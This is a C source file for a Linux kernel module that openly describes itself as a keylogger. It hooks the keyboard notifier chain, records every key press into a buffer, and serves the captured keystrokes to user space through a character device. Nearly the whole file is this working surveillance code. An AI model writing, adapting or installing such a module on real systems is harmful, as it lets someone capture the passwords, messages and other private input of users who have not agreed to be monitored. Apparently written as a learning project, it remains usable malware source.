#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/wait.h>
#include <linux/sched.h>

#define DEVICE_NAME "keylogger"
#define BUFFER_SIZE 1024

static int major;
static char key_buffer[BUFFER_SIZE];
static int buffer_pos = 0;
static struct class *keylogger_class = NULL;
static struct proc_dir_entry *proc_entry;
static wait_queue_head_t read_queue;
static int data_available = 0;

// Keyboard notifier block
static int keyboard_callback(struct notifier_block *nblock, unsigned long action, void *data);
static struct notifier_block nb = {
    .notifier_call = keyboard_callback
};

// Character device functions
static int device_open(struct inode *inode, struct file *file) {
    return 0;
}

static int device_close(struct inode *inode, struct file *file) {
    return 0;
}

static ssize_t device_read(struct file *file, char __user *user_buffer, size_t count, loff_t *ppos) {
    if (buffer_pos == 0)
        wait_event_interruptible(read_queue, data_available);
    
    if (copy_to_user(user_buffer, key_buffer, buffer_pos))
        return -EFAULT;
    
    int bytes_read = buffer_pos;
    buffer_pos = 0;
    data_available = 0;
    return bytes_read;
}

static ssize_t device_write(struct file *file, const char __user *user_buffer, size_t count, loff_t *ppos) {
    return -EINVAL;
}

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    return 0;
}

// File operations structure
static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
    .unlocked_ioctl = device_ioctl
};

static int keyboard_callback(struct notifier_block *nblock, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;
    if (action == KBD_KEYSYM && param->down) {
        if (buffer_pos < BUFFER_SIZE - 1) {
            key_buffer[buffer_pos++] = param->value;
            key_buffer[buffer_pos] = '\0';
            data_available = 1;
            wake_up_interruptible(&read_queue);
        }
    }
    return NOTIFY_OK;
}

static int __init keylogger_init(void) {
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0) {
        printk(KERN_ERR "Failed to register char device\n");
        return major;
    }
	keylogger_class = class_create(DEVICE_NAME);
    device_create(keylogger_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
    register_keyboard_notifier(&nb);
    init_waitqueue_head(&read_queue);
    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    device_destroy(keylogger_class, MKDEV(major, 0));
    class_destroy(keylogger_class);
    unregister_chrdev(major, DEVICE_NAME);
    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Andy, Hugh, Skye");
MODULE_DESCRIPTION("A simple Linux keylogger implementing a char device");
